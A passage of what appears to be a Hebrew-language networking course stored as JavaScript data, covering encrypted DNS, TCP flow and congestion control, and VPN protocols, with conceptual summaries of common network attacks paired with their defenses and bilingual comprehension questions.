          <p>כל מי שנמצא בדרך — ספק האינטרנט, רשת <code>WiFi</code> ציבורית — יכול לראות לאיזה אתרים גולשים.</p>
          <p><strong>DNS over HTTPS</strong> — <code>DoH</code></p>
          <p>שאילתות <code>DNS</code> מוצפנות בתוך <code>HTTPS</code> על פורט 443.</p>
          <p>מבחוץ לא ניתן להבדיל בינן לבין גלישה רגילה.</p>
          <p><strong>DNS over TLS</strong> — <code>DoT</code></p>
          <p>שאילתות DNS מוצפנות ב-<code>TLS</code> על פורט 853.</p>
          <p>התעבורה מוצפנת, אבל מכיוון שפורט 853 ייחודי ל-<code>DoT</code> — ניתן לזהות שמדובר בשאילתות DNS.</p>
          <table class="content-table">
            <tr><th></th><th>DoH</th><th>DoT</th><th>DNS רגיל</th></tr>
            <tr><td>פורט</td><td>443</td><td>853</td><td>53</td></tr>
            <tr><td>הצפנה</td><td>✅</td><td>✅</td><td>❌</td></tr>
            <tr><td>ניתן לחסום בפורט</td><td>קשה — 443 = הכל</td><td>קל — 853</td><td>קל — 53</td></tr>
            <tr><td>Firefox, Chrome</td><td>✅ מובנה</td><td>לא</td><td>ברירת מחדל</td></tr>
          </table>
          <p><code>Cloudflare</code> — <code>1.1.1.1</code>, <code>Google</code> — <code>8.8.8.8</code>, ו-<code>Mozilla</code> — כולם מספקים <code>DoH</code>.</p>
          <p><strong>מחלוקת:</strong> <code>DoH</code> ריכז שאילתות <code>DNS</code> בידי כמה ספקים גדולים בלבד.</p>
          <p>ארגונים מודאגים ש-<code>DoH</code> יעקוף את ה-<code>Firewall</code> הארגוני ויחשוף נתוני גלישה של עובדים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – DNS",
        intro: "<p>DNS כנקודת כשל ועוצמה:</p>",
        blocks: [
          {
            title: "DNS Hijacking – כשה-DNS עצמו מושחת",
            icon: "⚠️",
            content: `
              <p><strong>DNS Hijacking:</strong> ספקי אינטרנט מסוימים "חוטפים" שאילתות <code>DNS</code> לדומיינים שלא קיימים. במקום להחזיר <code>NXDOMAIN</code> — הם מציגים דף פרסומות.</p>
              <p><strong>DNS Spoofing / Cache Poisoning:</strong> תקיפה חמורה יותר. תוקף מזהם את ה-<code>cache</code> של <code>Resolver</code> עם תשובות מזויפות, ומפנה משתמשים לאתר פישינג.</p>
              <p><strong>DNSSEC</strong> — <code>DNS Security Extensions</code> — פותר זאת באמצעות חתימות קריפטוגרפיות על כל רשומה. הרשומה נחשבת אמיתית רק אם החתימה תקינה.</p>
            `
          },
          {
            title: "DNS כ-Choke Point של האינטרנט",
            icon: "🌐",
            content: `
              <p>ב-2016, התקפת <code>DDoS</code> ענקית על <code>Dyn</code> — ספקית DNS גדולה — הפילה את <code>Twitter</code>, <code>Netflix</code>, <code>GitHub</code> ו-<code>Reddit</code> לשעות.</p>
              <p><strong>הסיבה:</strong> <code>DNS</code> הוא תשתית קריטית שכל האינטרנט תלוי בה.</p>
              <p><strong>הפתרון:</strong> שימוש בכמה ספקי DNS שונים. כיום <code>Route53</code>, <code>Cloudflare</code> ו-<code>NS1</code> מציעים <code>Anycast</code> עם מאות נקודות נוכחות.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 19",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>היררכיה: <code>Root</code> — 13 לוגיים → <code>TLD</code> — .com → <code>Authoritative</code> — הרשומות האמיתיות</li>
              <li><code>Recursive Resolver</code> עושה את כל העבודה עבור הלקוח. <code>Cache</code> על <code>TTL</code></li>
              <li><code>Records</code>: <code>A</code> — <code>IPv4</code>, <code>AAAA</code> — <code>IPv6</code>, <code>CNAME</code> — alias, <code>MX</code> — mail, <code>TXT</code> — <code>SPF</code>/<code>DKIM</code>, <code>NS</code>, <code>PTR</code> — reverse, <code>SOA</code>, <code>CAA</code></li>
              <li><code>TTL</code> גבוה = מהיר, איטי להשתנות. <code>TTL</code> נמוך = גמיש, עמוס</li>
              <li><code>DoH</code> — פורט 443, <code>DoT</code> — פורט 853. DNS מוצפן להגנת פרטיות</li>
              <li>dig = כלי מקצועי. dig +trace = מסלול מלא. ipconfig /flushdns = ניקוי cache</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 19",
        titleEn: "Chapter 19 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Recursive Resolver ל-Authoritative Nameserver?",
            a: "Recursive Resolver = שרת שפועל בשם הלקוח, מריץ queries לכל השרתים בהיררכיה עד שמגיע לתשובה. לרוב מנוהל ע\"י ISP או ספק (1.1.1.1). Authoritative = המקור האמיתי לדומיין ספציפי – מחזיר תשובה סופית ללא delegation נוסף.",
            qEn: "What is the difference between a Recursive Resolver and an Authoritative Nameserver?",
            aEn: "A Recursive Resolver works on behalf of the client, running queries to all servers in the hierarchy until it gets an answer. Usually managed by an ISP or provider (1.1.1.1). An Authoritative Nameserver is the real source for a specific domain — it returns a final answer with no further delegation."
          },
          {
            q: "למה צריך CNAME ולא רק A record?",
            a: "CNAME מאפשר לכמה שמות לכוון לאותו שרת בלי כפילות. אם ה-IP משתנה, מספיק לשנות A record אחד – כל ה-CNAMEs עוקבים אוטומטית. דוגמה: blog.example.com, shop.example.com שניהם CNAME ל-example.com.",
            qEn: "Why do we need CNAME and not just A records?",
            aEn: "CNAME lets multiple names point to the same server without duplication. If the IP changes, you only update one A record — all CNAMEs follow automatically. Example: blog.example.com and shop.example.com both CNAME to example.com."
          },
          {
            q: "מה TXT record ולמה הוא שימושי?",
            a: "TXT record מכיל טקסט חופשי. שימושים: SPF (מי רשאי לשלוח מייל מהדומיין), DKIM (חתימה על מיילים), DMARC (מדיניות אימות מייל), אימות בעלות על הדומיין (Google Search Console, SSL cert). מגן מפני זיוף מיילים (email spoofing).",
            qEn: "What is a TXT record and why is it useful?",
            aEn: "A TXT record holds free text. Uses: SPF (who can send email from this domain), DKIM (email signing), DMARC (email authentication policy), domain ownership verification (Google Search Console, SSL cert). It protects against email spoofing."
          }
        ]
      }
    ]
  },
  {
    id: 20,
    title: "TCP בעומק – Flow Control, Congestion, Sliding Window",
    pages: [
      {
        type: "explanation",
        title: "בעיות ש-TCP צריך לפתור",
        content: `
          <p><code>TCP</code> מבטיח העברה אמינה — אבל יש שלוש בעיות נפרדות שצריך לפתור:</p>
          <ul>
            <li><strong>אובדן חבילות</strong> – פקטה לא הגיעה, צריך לשלוח שוב</li>
            <li><strong><code>Flow Control</code></strong> – שולח מהיר מציף מקבל איטי</li>
            <li><strong><code>Congestion Control</code></strong> – כולם שולחים, הרשת עמוסה, כולם מאטים</li>
          </ul>
          <p><code>TCP</code> פותר את שלושתן, כל אחת בנפרד.</p>
        `
      },
      {
        type: "explanation",
        title: "Sliding Window – Flow Control",
        content: `
          <p><strong><code>Flow Control</code></strong> מונע ממחשב מהיר להציף מחשב איטי.</p>
          <p>הפתרון: <strong>Receive Window</strong> — <code>rwnd</code>.</p>
          <p>בכל <code>ACK</code>, המקבל מודיע: "יש לי <code>rwnd</code> בתים מקום ב-buffer — שלח עד כאן".</p>
          <p>השולח לא שולח יותר מ-<code>rwnd</code> בתים בכל רגע.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="20" width="280" height="60" rx="4" fill="var(--bg-elevated)" stroke="var(--accent)"/>
              <rect x="10" y="20" width="100" height="60" rx="0" fill="var(--accent-green)" opacity="0.6"/>
              <rect x="110" y="20" width="80" height="60" rx="0" fill="var(--accent-gold)" opacity="0.6"/>
              <text x="60" y="55" text-anchor="middle" font-size="9" fill="var(--text)">נשלח ← ACK</text>
              <text x="150" y="48" text-anchor="middle" font-size="9" fill="var(--text)">נשלח</text>
              <text x="150" y="62" text-anchor="middle" font-size="9" fill="var(--text)">ממתין ACK</text>
              <text x="245" y="55" text-anchor="middle" font-size="9" fill="var(--text-muted)">מחכה לשליחה</text>
              <path d="M 190 5 L 190 18" stroke="var(--accent-gold)" stroke-width="2"/>
              <path d="M 290 5 L 290 18" stroke="var(--accent)" stroke-width="2"/>
              <text x="240" y="12" text-anchor="middle" font-size="9" fill="var(--accent-gold)">← rwnd →</text>
            </svg>
            <p class="diagram-caption">Sliding Window – רק הנתונים בחלון צהוב בטיסה</p>
          </div>
          <p><strong>Window Scaling</strong> — <code>RFC 1323</code></p>
          <p>שדה <code>rwnd</code> הוא 16 ביטים בלבד, המגביל את החלון ל-65,535 בתים.</p>
          <p>זה לא מספיק לחיבורים מהירים.</p>
          <p><code>Window Scale</code> הוא מכפיל של עד 2^14:</p>
          <ul>
            <li>עם Scale=10: חלון מקסימלי של כ-64MB</li>
            <li>עם Scale=14 (מקסימום): חלון מקסימלי של כ-1GB</li>
          </ul>
          <p>אם <code>rwnd=0</code> — השולח מפסיק לשלוח ושולח <code>Zero Window Probe</code> כל כמה שניות עד שהמקבל יפתח.</p>
        `
      },
      {
        type: "explanation",
        title: "Congestion Control – Slow Start",
        content: `
          <p><strong><code>Congestion Control</code></strong> מונע מכולם להציף את הרשת.</p>
          <p>השולח מנהל <strong>Congestion Window</strong> — <code>cwnd</code>.</p>
          <p>הכלל: מספר הבתים בטיסה ≤ הערך הנמוך מבין <code>cwnd</code> ו-<code>rwnd</code>.</p>
          <p><strong><code>Slow Start</code></strong> – בפתיחת חיבור, <code>cwnd</code> מתחיל קטן ומתגדל במהירות:</p>
          <ul>
            <li><code>cwnd</code> מתחיל ב-1 עד 10 MSS — <code>Maximum Segment Size</code> ≈ 1460 בתים</li>
            <li>כל ACK שמגיע → cwnd += 1 MSS</li>
            <li>כל RTT → cwnd מכפיל (גידול אקספוננציאלי)</li>
            <li>ממשיך עד שמגיע ל-<strong>ssthresh</strong> — <code>Slow Start Threshold</code></li>
          </ul>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 300 120" class="content-diagram">
              <line x1="30" y1="10" x2="30" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
              <line x1="30" y1="110" x2="290" y2="110" stroke="var(--text-muted)" stroke-width="1.5"/>
              <text x="18" y="114" font-size="8" fill="var(--text-muted)">0</text>
              <text x="18" y="15" font-size="8" fill="var(--text-muted)">cwnd</text>
              <text x="290" y="116" font-size="8" fill="var(--text-muted)">RTT</text>
              <polyline points="30,108 60,100 90,85 120,60 150,42 180,38 210,34 240,30" fill="none" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="150" y1="10" x2="150" y2="110" stroke="var(--accent-gold)" stroke-width="1" stroke-dasharray="4,3"/>
              <text x="152" y="25" font-size="8" fill="var(--accent-gold)">ssthresh</text>
              <text x="50" y="72" font-size="8" fill="var(--accent-green)">Slow Start</text>
              <text x="165" y="50" font-size="8" fill="var(--text)">Cong. Avoid.</text>
            </svg>
            <p class="diagram-caption">Slow Start: גידול אקספוננציאלי → Congestion Avoidance: לינארי</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "Congestion Avoidance ו-AIMD",
        content: `
          <p>לאחר שמגיע ל-<code>ssthresh</code>, <code>TCP</code> עובר ל-<strong><code>Congestion Avoidance</code></strong>:</p>
          <ul>
            <li>גידול לינארי: כל RTT → cwnd += 1 MSS</li>
            <li>האלגוריתם: <strong><code>AIMD</code></strong> — <code>Additive Increase, Multiplicative Decrease</code></li>
          </ul>
          <p><strong>זיהוי אובדן</strong> — <code>Loss Detection</code>:</p>
          <p><strong>שיטה 1 — Timeout</strong> — <code>RTO</code>: לא הגיע ACK בזמן:</p>
          <ul>
            <li>ssthresh = cwnd / 2</li>
            <li><code>cwnd</code> = 1 MSS — חזרה ל-Slow Start מהתחלה</li>
            <li><code>RTO</code> מוכפל — <code>Exponential Backoff</code></li>
          </ul>
          <p><strong>שיטה 2 — 3 Duplicate ACKs</strong> — <code>Fast Retransmit</code>: 3 ACKs לאותו sequence = חבילה אחת אבדה:</p>
          <ul>
            <li>שולח מיד — לא מחכה ל-timeout</li>
            <li>ssthresh = cwnd / 2; cwnd = ssthresh + 3 MSS</li>
            <li><strong><code>Fast Recovery</code></strong> – לא חוזרים ל-<code>Slow Start</code>, נשארים ב-<code>Congestion Avoidance</code></li>
          </ul>
          <p><code>Timeout</code> = ייתכן שהרשת עמוסה מאוד.</p>
          <p><code>Dup-ACKs</code> = כנראה חבילה בודדת אבדה, הרשת עדיין עובדת.</p>
        `
      },
      {
        type: "explanation",
        title: "RTT ו-RTO – חישוב Timeout",
        content: `
          <p>כמה זמן לחכות לפני Timeout?</p>
          <p><code>TCP</code> מחשב <strong>RTO</strong> — <code>Retransmission Timeout</code> — באופן דינמי:</p>
          <p><strong>SRTT</strong> — <code>Smoothed RTT</code></p>
          <p>ממוצע משוקלל של מדידות ה-RTT:</p>
          <div class="code-preview">
            <pre><code>α = 0.125
SRTT = (1 - α) × SRTT + α × RTT_sample</code></pre>
          </div>
          <p><strong>RTTVAR</strong> – שונות RTT:</p>
          <div class="code-preview">
            <pre><code>β = 0.25
RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
          </div>
          <p><strong>RTO:</strong></p>
          <div class="code-preview">
            <pre><code>RTO = SRTT + 4 × RTTVAR  (מינימום 1 שניה)</code></pre>
          </div>
          <p><strong>Karn's Algorithm:</strong> לא מחשבים דגימת <code>RTT</code> מחבילה ששודרה מחדש.</p>
          <p>הסיבה: אי אפשר לדעת אם ה-<code>ACK</code> שייך לשליחה הראשונה או לשנייה.</p>
          <p><code>RTO</code> מוכפל עם כל <code>timeout</code> עוקב — <code>Exponential Backoff</code> — עד מגבלה של 60 עד 120 שניות.</p>
        `
      },
      {
        type: "explanation",
        title: "אלגוריתמי Congestion מודרניים",
        content: `
          <table class="content-table">
            <tr><th>אלגוריתם</th><th>הגישה</th><th>שימוש</th></tr>
            <tr><td><strong><code>TCP Reno</code></strong></td><td><code>AIMD</code> קלאסי, מגיב לאובדן</td><td>היסטורי, ברירת מחדל ישנה</td></tr>
            <tr><td><strong><code>TCP CUBIC</code></strong></td><td>פונקציה קוביקית של הזמן מאז האובדן האחרון. אגרסיבי יותר ב-<code>high-BDP</code></td><td><code>Linux</code> ברירת מחדל</td></tr>
            <tr><td><strong><code>BBR</code></strong> — <code>Google</code></td><td><code>Bottleneck Bandwidth</code> + <code>RTT</code>. מודד רוחב פס ולא מסתמך על אובדן כסימן</td><td><code>YouTube</code>, <code>Google Cloud</code>. מצוין ב-<code>WiFi</code> ולווין</td></tr>
            <tr><td><strong><code>QUIC</code>/<code>HTTP3</code></strong></td><td><code>UDP</code> עם <code>congestion control</code> מובנה + <code>TLS 1.3</code>. מנגנון נפרד לכל <code>stream</code></td><td><code>Google</code> (60% תעבורה), <code>HTTP/3</code></td></tr>
          </table>
          <p><strong>BDP</strong> — <code>Bandwidth-Delay Product</code></p>
          <p>רוחב פס כפול זמן ה-<code>RTT</code>.</p>
          <p>זהו מספר הבתים שנמצאים "בטיסה" ברשת בכל רגע נתון.</p>
          <p><strong>דוגמה:</strong></p>
          <p>חיבור של 1Gbps עם RTT של 100ms → BDP = 12.5MB.</p>
          <p>כדי לנצל את החיבור במלואו, גודל ה-<code>window</code> חייב להיות לפחות כגודל ה-BDP.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – TCP",
        intro: "<p>למה TCP נשאר רלוונטי אחרי 40 שנה:</p>",
        blocks: [
          {
            title: "TCP על קישורי לווין – BDP בעיה",
            icon: "🛰️",
            content: `
              <p>לווין גיאוסטציונרי מייצר <code>RTT</code> של כ-600ms.</p>
              <p><code>BDP</code> = 100Mbps × 0.6 שניות = <strong>7.5MB</strong>.</p>
              <p><code>TCP</code> ישן עם חלון של 65KB ינצל רק 65KB/600ms = <strong>0.87Mbps</strong> מתוך 100Mbps!</p>
              <p><strong>פתרונות:</strong></p>
              <ul>
                <li><code>BBR</code> ו-<code>Window Scaling</code> — מגדילים את חלון השליחה</li>
                <li><code>Starlink</code> — מסלול <code>LEO</code>, RTT של 20ms — עוקפת את הבעיה בגישה אחרת</li>
              </ul>
              <p><strong>המסקנה:</strong> הגדרות <code>TCP</code> חייבות להתאים לתנאי הרשת הפיזיים.</p>
            `
          },
          {
            title: "Nagle's Algorithm – מיקרו-אופטימיזציה",
            icon: "⚡",
            content: `
              <p><strong>Nagle's Algorithm:</strong> <code>TCP</code> מחכה עד שיש מספיק נתונים למילוי <code>MSS</code> לפני ששולח חבילה. מונע הצפת הרשת בחבילות זעירות.</p>
              <p><strong>דוגמה:</strong> <code>SSH</code> שולח כל הקשת מקלדת כחבילה נפרדת. בלי Nagle — הרשת מוצפת בחבילות קטנטנות.</p>
              <p><strong>הבעיה:</strong> באפליקציות Real-Time כמו משחקים ומסחר, ההמתנה מוסיפה השהיה.</p>
              <p><strong>הפתרון:</strong> הדגל <code>TCP_NODELAY</code> מכבה את Nagle. כל גיימר וסוחר מהיר מכירים אותו.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 20",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Flow Control</code>: <code>rwnd</code> – המקבל מודיע כמה מקום יש. שולח לא שולח יותר</li>
              <li><code>Congestion Control</code>: <code>cwnd</code> – שולח מנהל עצמו לפי עומס רשת</li>
              <li><code>Slow Start</code>: גידול אקספוננציאלי. <code>Congestion Avoidance</code> — <code>AIMD</code>: לינארי</li>
              <li><code>Loss</code>: <code>Timeout</code> → <code>cwnd</code>=1. 3 <code>Dup-ACKs</code> → <code>Fast Retransmit</code> + <code>Fast Recovery</code> — <code>cwnd</code>=<code>ssthresh</code></li>
              <li><code>RTO</code> = <code>SRTT</code> + 4×<code>RTTVAR</code>. <code>Karn's Algorithm</code>. <code>Exponential Backoff</code></li>
              <li><code>CUBIC</code> — <code>Linux</code>, <code>BBR</code> — <code>Google</code>, <code>QUIC</code>/<code>HTTP3</code> — אלגוריתמים מודרניים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 20",
        titleEn: "Chapter 20 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Flow Control ל-Congestion Control?",
            a: "Flow Control מגן על המקבל – rwnd קובע כמה אפשר לשלוח לפי ה-buffer של המקבל. Congestion Control מגן על הרשת – cwnd קובע כמה אפשר לשלוח לפי עומס הרשת. אפקטיבי: min(cwnd, rwnd).",
            qEn: "What is the difference between Flow Control and Congestion Control?",
            aEn: "Flow Control protects the receiver — rwnd sets how much can be sent based on the receiver's buffer. Congestion Control protects the network — cwnd sets how much can be sent based on network load. Effective window: min(cwnd, rwnd)."
          },
          {
            q: "למה Slow Start מתחיל איטי אבל מאיץ מהיר?",
            a: "Slow Start מתחיל ב-1 MSS כדי לא להציף רשת שמצב לא ידוע. אבל גידול אקספוננציאלי (מכפיל כל RTT) אומר שב-10 RTT כבר מגיע ל-1024 MSS ≈ 1.5MB. זה 'איטי' רק ביחס לפתיחה ב-מהירות מלאה, אבל בפועל מהיר מאוד.",
            qEn: "Why does Slow Start begin slow but speed up fast?",
            aEn: "Slow Start begins with 1 MSS to avoid flooding a network whose state is unknown. But exponential growth (doubling every RTT) means that in 10 RTTs it already reaches 1024 MSS (about 1.5MB). It is 'slow' only compared to starting at full speed, but in practice it is very fast."
          },
          {
            q: "מה Fast Retransmit ולמה הוא עדיף על Timeout?",
            a: "3 Duplicate ACKs = צד אחד קיבל חבילות אחרי החסרה, אז הוא שולח ACKs חוזרים ל-seq האחרון שקיבל. Fast Retransmit שולח מיד ולא מחכה ל-RTO (שיכול להיות שניות). Fast Recovery לא מחזיר ל-Slow Start – cwnd נשאר גבוה. הרשת עדיין עובדת, רק חבילה אחת אבדה.",
            qEn: "What is Fast Retransmit and why is it better than Timeout?",
            aEn: "3 Duplicate ACKs mean one side received packets after the missing one, so it sends repeated ACKs for the last sequence it got. Fast Retransmit resends immediately instead of waiting for RTO (which can take seconds). Fast Recovery does not go back to Slow Start — cwnd stays high. The network still works, only one packet was lost."
          }
        ]
      }
    ]
  },
  {
    id: 21,
    title: "VPN ואבטחת רשת",
    pages: [
      {
        type: "explanation",
        title: "מה זה VPN?",
        content: `
          <p><strong>VPN</strong> — <code>Virtual Private Network</code></p>
          <p>יוצר "מנהרה" מוצפנת בין שתי נקודות דרך רשת ציבורית.</p>
          <p>החיבור נראה כאילו הוא פרטי וישיר, גם אם הוא עובר דרך האינטרנט.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="54" text-anchor="middle" font-size="10">עובד</text>
              <text x="45" y="66" text-anchor="middle" font-size="8" fill="var(--text-muted)">ביתי</text>
              <rect x="260" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="295" y="50" text-anchor="middle" font-size="10">רשת</text>
              <text x="295" y="62" text-anchor="middle" font-size="10">חברה</text>
              <path d="M 80 50 Q 170 20 260 50" stroke="var(--accent-green)" stroke-width="3" fill="none" stroke-dasharray="8,4"/>
              <rect x="130" y="15" width="80" height="25" rx="4" fill="#3a3a6a" stroke="var(--accent)"/>
              <text x="170" y="31" text-anchor="middle" font-size="9" fill="white">🔒 מנהרה VPN</text>
              <text x="80" y="80" font-size="8" fill="var(--text-muted)">אינטרנט ציבורי</text>
            </svg>
          </div>
          <p><strong>שני סוגים עיקריים:</strong></p>
          <ul>
            <li><strong>Remote Access VPN</strong> – עובד מהבית מתחבר לרשת החברה. תוכנת Client מותקנת על המחשב</li>
            <li><strong>Site-to-Site VPN</strong> – מחבר שני משרדים באופן קבוע. הנתבים מנהלים את המנהרה, לא המחשבים הבודדים</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "IPsec – VPN ברמת Layer 3",
        content: `
          <p><strong><code>IPsec</code></strong> פועל בשכבת הרשת — <code>Layer 3</code>.</p>
          <p>מספק: אימות, שלמות, הצפנה, ומניעת replay.</p>
          <p><strong>שני פרוטוקולים:</strong></p>
          <ul>
            <li><strong><code>AH</code></strong> — <code>Authentication Header</code>. אימות ושלמות בלבד, ללא הצפנה. פרוטוקול 51</li>
            <li><strong><code>ESP</code></strong> — <code>Encapsulating Security Payload</code>. הצפנה + אימות + שלמות. פרוטוקול 50. <strong>זה מה שמשתמשים בפועל</strong></li>
          </ul>
          <p><strong>שני מצבים:</strong></p>
          <table class="content-table">
            <tr><th>מצב</th><th>מה מוצפן</th><th>שימוש</th></tr>
            <tr><td><code>Transport</code></td><td><code>Payload</code> בלבד, <code>IP Header</code> גלוי</td><td><code>Host-to-Host</code></td></tr>
            <tr><td><code>Tunnel</code></td><td>כל הפקטה המקורית עטופה בפקטה חדשה</td><td><code>VPN Gateways</code>, <code>Site-to-Site</code></td></tr>
          </table>
          <p><strong>IKE</strong> — <code>Internet Key Exchange</code></p>
          <p>שלב חילופי המפתחות, <code>UDP</code> פורט 500:</p>
          <ul>
            <li><strong><code>IKEv1</code></strong> — שני שלבים — Phase 1 + Phase 2. גרסה ישנה</li>
            <li><strong><code>IKEv2</code></strong> — מועדף. יעיל יותר, <code>NAT Traversal</code> מובנה — <code>UDP</code> 4500, תמיכה ב-<code>MOBIKE</code></li>
          </ul>
          <p><strong>קריפטוגרפיה:</strong></p>
          <ul>
            <li>הצפנה: <code>AES-256-GCM</code></li>
            <li>אימות: <code>HMAC-SHA256</code></li>
            <li>חילופי מפתחות: <code>Diffie-Hellman</code> — DH group 14 = 2048bit, או 19/20 = ECDH</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "WireGuard – VPN מודרני ומינימליסטי",
        content: `
          <p><strong>WireGuard</strong> – פרוטוקול VPN מודרני.</p>
          <p>כ-4,000 שורות קוד — לעומת <code>OpenVPN</code> עם כ-600,000.</p>
          <p>מובנה ב-<code>Linux kernel</code> מגרסה 5.6.</p>
          <p><strong>עקרונות מרכזיים:</strong></p>
          <ul>
            <li><strong>UDP בלבד</strong> – אין overhead של TCP. מתחבר מחדש שקטית אחרי שינוי רשת (רואמינג)</li>
            <li><strong>Cryptography קבוע</strong> — אין negotiation, אין cipher agility: תמיד <code>Curve25519</code> — ECDH + <code>ChaCha20-Poly1305</code> + <code>BLAKE2s</code></li>
            <li><strong>Public/Private Keys</strong> – אין certificates, אין PKI. כל peer מוגדר ע"י מפתח ציבורי</li>
            <li><strong>Cryptokey Routing</strong> – כל peer מוגדר עם allowed-IPs: "רשת X מגיעה דרך peer Y"</li>
          </ul>
          <div class="code-preview">
            <pre><code># /etc/wireguard/wg0.conf
[Interface]
PrivateKey = &lt;מפתח פרטי&gt;
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = &lt;מפתח ציבורי של peer&gt;
AllowedIPs = 10.0.0.2/32
Endpoint = peer.example.com:51820</code></pre>
          </div>
          <p><strong>ביצועים:</strong> WireGuard מהיר ב-50–100% מ-OpenVPN, קרוב ל-IPsec.</p>
          <p>מצוין ל-mobile — reconnect אחרי מעבר <code>WiFi</code>↔<code>Cellular</code> מהיר וחלק.</p>
        `
      },
      {
        type: "explanation",
        title: "OpenVPN ו-Split Tunneling",
        content: `
          <p><strong>OpenVPN</strong> – VPN מבוסס <code>TLS</code>.</p>
          <p>עובד על <code>TCP</code> 443 או <code>UDP</code> 1194. עובר בקלות דרך <code>Firewalls</code>, כי פורט 443 נראה כמו <code>HTTPS</code> רגיל.</p>
          <p><strong>Full Tunnel לעומת Split Tunneling:</strong></p>
          <table class="content-table">
            <tr><th></th><th>Full Tunnel</th><th>Split Tunnel</th></tr>
            <tr><td>תעבורה</td><td>הכל דרך VPN</td><td>רק תעבורה ארגונית דרך VPN</td></tr>
            <tr><td>אינטרנט</td><td>דרך VPN Gateway</td><td>ישירות מהלקוח</td></tr>
            <tr><td>אבטחה</td><td>גבוהה – הכל מפוקח</td><td>נמוכה – אינטרנט לא עובר Firewall</td></tr>
            <tr><td>עומס VPN</td><td>גבוה</td><td>נמוך</td></tr>
            <tr><td>ביצועים</td><td>איטי לאינטרנט</td><td>מהיר לאינטרנט</td></tr>
          </table>
          <p><strong>VPN לפרטיות (שימוש צרכני)</strong></p>
          <p>שירותים כמו <code>ProtonVPN</code> ו-<code>Mullvad</code> מנתבים את כל התעבורה דרך השרתים שלהם.</p>
          <p>ספק האינטרנט רואה רק חיבור לשרת ה-VPN, לא לאתרים עצמם.</p>
          <p><strong>חשוב להבין:</strong> ספק ה-VPN עצמו יכול לראות את כל התעבורה.</p>
          <p>זה לא קסם — אלא העברת אמון מגורם אחד לאחר.</p>
        `
      },
      {
        type: "explanation",
        title: "אבטחת רשת – איומים נפוצים",
        content: `
          <p><strong><code>ARP Spoofing</code> / <code>ARP Poisoning</code></strong></p>
          <p>תוקף שולח הודעת <code>ARP Reply</code> מזויפת: "אני ה-Gateway, כתובת ה-MAC שלי היא XX:XX".</p>
          <p>כתוצאה, כל התעבורה מופנית אליו — מתקפת <code>MITM</code>.</p>
          <p><strong>מניעה:</strong> <code>Dynamic ARP Inspection</code> ב-Switch, או הגדרת כתובות ARP קריטיות כסטטיות.</p>
          <p><strong><code>DNS Spoofing</code> / <code>Cache Poisoning</code></strong></p>
          <p>תוקף מזהם את ה-cache של <code>DNS Resolver</code> בתשובות מזויפות.</p>
          <p>כל מי שמסתמך על אותו Resolver מנותב לשרת פישינג.</p>
          <p><strong>מניעה:</strong> <code>DNSSEC</code>.</p>
          <p><strong><code>DoS</code> / <code>DDoS</code></strong></p>
          <p>הצפת שרת או רשת בתעבורה עד לקריסה.</p>
          <p><strong>דוגמה:</strong></p>
          <p><code>SYN Flood</code> — התוקף שולח כמויות אינסופיות של חבילות <code>SYN</code> ללא <code>ACK</code>. השרת מקצה זיכרון לכל חיבור ומתמלא.</p>
          <p><strong>מניעה:</strong> <code>SYN Cookies</code>, <code>Rate Limiting</code>, <code>CDN</code> עם <code>Anycast</code>.</p>
          <p><strong><code>Port Scanning</code></strong></p>
          <p>כלי כמו <code>nmap</code> שולח חבילות <code>SYN</code> לכל הפורטים ומזהה אילו פתוחים.</p>
          <p>זהו חלק בסיסי מכל בדיקת חדירה.</p>
          <p><strong>הגנה:</strong> <code>Firewall</code> עם מדיניות <code>default-deny</code> ומינימום פורטים פתוחים.</p>
          <p><strong>Man-in-the-Middle</strong> — <code>MITM</code></p>
          <p>תוקף ממקם את עצמו בין שני צדדים מתקשרים ומסנף או משנה את התעבורה.</p>
          <p><strong>הגנה:</strong></p>
          <ul>
            <li><code>HTTPS</code> עם <code>Certificate Pinning</code></li>
            <li><code>HSTS</code> — <code>HTTP Strict Transport Security</code> — מונע נפילה ל-<code>HTTP</code> לא מוצפן</li>
          </ul>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – VPN ואבטחה",
        intro: "<p>אמת ושקר על VPN ואבטחת רשת:</p>",
        blocks: [
          {
            title: "VPN לא עושה אותך 'אנונימי'",
            icon: "🕵️",
            content: `
              <p><code>VPN</code> מסתיר את כתובת ה-IP שלך מהאתר — אבל זה לא מספיק לאנונימיות.</p>
              <p><strong>מה עדיין חושף אותך:</strong></p>
              <ul>
                <li><code>Fingerprint</code> — גודל מסך, גופנים, גרסת דפדפן, <code>WebRTC IP</code></li>
                <li>עוגיות עוקבות</li>
                <li>חשבונות <code>Google</code> / <code>Facebook</code></li>
              </ul>
              <p><strong>אנונימיות אמיתית</strong> דורשת <code>Tor</code> ותרגולים נוספים. VPN הוא שכבת פרטיות נוספת, לא כיסוי מושלם.</p>
            `
          },
          {
            title: "Zero Trust – האמן לאף אחד",
            icon: "🔐",
            content: `
